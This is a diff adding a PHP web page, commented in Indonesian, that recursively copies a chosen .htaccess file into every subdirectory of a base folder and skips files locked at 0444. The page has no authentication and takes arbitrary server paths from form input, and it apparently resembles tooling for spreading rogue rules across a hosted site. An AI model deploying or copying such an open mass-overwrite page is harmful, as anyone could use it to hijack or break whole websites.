@@ -1,0 +1,232 @@
+<?php
+/*
+ * PROFESSIONAL MASS HTACCESS DEPLOYER V2
+ * GUI Version | Recursive | 0444 Protection
+ */
+set_time_limit(0);
+ini_set('memory_limit', '-1');
+ini_set('display_errors', 0); // Sembunyikan error PHP native agar UI tetap bersih
+
+$message = "";
+$report = [];
+$stats = ['success' => 0, 'locked' => 0, 'fail' => 0];
+
+// Logic Pemrosesan
+if (isset($_POST['execute'])) {
+    $sourceFile = trim($_POST['source_file']);
+    $baseDir = rtrim(trim($_POST['base_dir']), '/'); // Hapus slash di akhir jika ada
+
+    if (!file_exists($sourceFile)) {
+        $message = "<div class='alert error'>Error: File sumber (.htaccess) tidak ditemukan di path tersebut!</div>";
+    } elseif (!is_dir($baseDir)) {
+        $message = "<div class='alert error'>Error: Direktori target tidak valid!</div>";
+    } else {
+        // Mulai Operasi
+        try {
+            $iterator = new RecursiveIteratorIterator(
+                new RecursiveDirectoryIterator($baseDir, RecursiveDirectoryIterator::SKIP_DOTS),
+                RecursiveIteratorIterator::SELF_FIRST
+            );
+
+            foreach ($iterator as $item) {
+                if ($item->isDir()) {
+                    $currentDir = $item->getPathname();
+                    $targetFile = $currentDir . '/.htaccess';
+                    
+                    // Status default
+                    $status = 'process'; 
+
+                    // Cek keberadaan file dan permission
+                    if (file_exists($targetFile)) {
+                        $perms = substr(sprintf('%o', fileperms($targetFile)), -4);
+                        
+                        if ($perms == '0444' || $perms == '444') {
+                            $stats['locked']++;
+                            $report[] = ['path' => $currentDir, 'status' => 'LOCKED (0444)', 'class' => 'locked'];
+                            continue; // SKIP
+                        }
+                    }
+
+                    // Proses Copy
+                    if (@copy($sourceFile, $targetFile)) {
+                        $stats['success']++;
+                        // Opsional: uncomment baris bawah jika ingin list folder sukses juga (bisa bikin berat loading jika ribuan folder)
+                        // $report[] = ['path' => $currentDir, 'status' => 'SUCCESS', 'class' => 'success'];
+                    } else {
+                        $stats['fail']++;
+                        $report[] = ['path' => $currentDir, 'status' => 'FAILED (Permission Denied)', 'class' => 'fail'];
+                    }
+                }
+            }
+            $message = "<div class='alert success'>Deploy Selesai! Cek laporan di bawah.</div>";
+        } catch (Exception $e) {
+            $message = "<div class='alert error'>System Error: " . $e->getMessage() . "</div>";
+        }
+    }
+}
+
+// Auto-fill path untuk memudahkan user
+$defaultBase = getcwd();
+$defaultSource = $defaultBase . '/net/.htaccess';
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mass .htaccess Deployer Pro</title>
+    <style>
+        :root {
+            --bg: #0f172a;
+            --card: #1e293b;
+            --text: #e2e8f0;
+            --accent: #38bdf8;
+            --success: #22c55e;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 900px;
+        }
+        .card {
+            background-color: var(--card);
+            padding: 2rem;
+            border-radius: 30px;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
+            margin-bottom: 20px;
+            border: 1px solid #334155;
+        }
+        h1 { margin-top: 0; color: #ff0000; font-size: 1.5rem; text-transform: uppercase; letter-spacing: 1px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: #94a3b8; }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            background: #0f172a;
+            border: 1px solid #334155;
+            color: #fff;
+            border-radius: 15px;
+            margin-bottom: 15px;
+            font-family: monospace;
+            box-sizing: border-box;
+        }
+        input[type="text"]:focus { outline: 2px solid #ff0000; border-color: transparent; }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #ff0000;
+            color: #fff;
+            font-weight: bold;
+            border: none;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-transform: uppercase;
+        }
+        button:hover { background: #0ea5e9; transform: translateY(-1px); }
+        
+        /* Stats Grid */
+        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
+        .stat-box { padding: 15px; border-radius: 8px; text-align: center; font-weight: bold; }
+        .stat-success { background: rgba(34, 197, 94, 0.2); color: var(--success); border: 1px solid var(--success); }
+        .stat-locked { background: rgba(245, 158, 11, 0.2); color: var(--warning); border: 1px solid var(--warning); }
+        .stat-fail { background: rgba(239, 68, 68, 0.2); color: var(--danger); border: 1px solid var(--danger); }
+        .stat-number { font-size: 1.5rem; display: block; }
+
+        /* Report Table */
+        .report-log {
+            max-height: 400px;
+            overflow-y: auto;
+            background: #000;
+            border-radius: 8px;
+            padding: 10px;
+            border: 1px solid #334155;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+        .log-item { padding: 5px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; }
+        .log-item:last-child { border-bottom: none; }
+        .status-badge { padding: 2px 6px; border-radius: 4px; font-size: 0.8rem; }
+        
+        .locked .status-badge { background: var(--warning); color: #000; }
+        .fail .status-badge { background: var(--danger); color: #fff; }
+        
+        .alert { padding: 15px; border-radius: 15px; margin-bottom: 20px; font-weight: bold; text-align: center; }
+        .alert.success { background: rgba(34, 197, 94, 0.2); color: var(--success); border: 1px solid var(--success); }
+        .alert.error { background: rgba(239, 68, 68, 0.2); color: var(--danger); border: 1px solid var(--danger); }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #0f172a; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #475569; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="card">
+        <h1>🚀 Mass .htaccess Deployer</h1>
+        <p style="color:#64748b; margin-top:-10px; font-size:0.9rem;">Recursive Copy & 0444 Protection System</p>
+        
+        <?= $message ?>
+
+        <form method="POST">
+            <label>📂 Source File (.htaccess Induk)</label>
+            <input type="text" name="source_file" value="<?= isset($_POST['source_file']) ? htmlspecialchars($_POST['source_file']) : $defaultSource ?>" placeholder="/var/www/.../net/.htaccess" required>
+
+            <label>🎯 Target Directory (Base Folder)</label>
+            <input type="text" name="base_dir" value="<?= isset($_POST['base_dir']) ? htmlspecialchars($_POST['base_dir']) : $defaultBase ?>" placeholder="/var/www/.../web/" required>
+
+            <button type="submit" name="execute">START DEPLOYMENT</button>
+        </form>
+
+        <?php if (isset($_POST['execute'])): ?>
+            <div class="stats-grid">
+                <div class="stat-box stat-success">
+                    <span class="stat-number"><?= $stats['success'] ?></span>
+                    SUCCESS
+                </div>
+                <div class="stat-box stat-locked">
+                    <span class="stat-number"><?= $stats['locked'] ?></span>
+                    LOCKED (0444)
+                </div>
+                <div class="stat-box stat-fail">
+                    <span class="stat-number"><?= $stats['fail'] ?></span>
+                    FAILED
+                </div>
+            </div>
+
+            <?php if (!empty($report)): ?>
+                <h3 style="margin-top:20px; border-bottom: 1px solid #333; padding-bottom:10px;">⚠️ Locked / Failed Paths</h3>
+                <div class="report-log">
+                    <?php foreach ($report as $log): ?>
+                        <div class="log-item <?= $log['class'] ?>">
+                            <span><?= $log['path'] ?></span>
+                            <span class="status-badge"><?= $log['status'] ?></span>
+                        </div>
+                    <?php endforeach; ?>
+                </div>
+            <?php elseif($stats['locked'] == 0 && $stats['fail'] == 0): ?>
+                 <div style="margin-top:20px; text-align:center; color: #64748b;">
+                    <i>All clean. Tidak ada file terkunci (0444) yang ditemukan.</i>
+                 </div>
+            <?php endif; ?>
+
+        <?php endif; ?>
+    </div>
+</div>
+
+</body>
+</html>
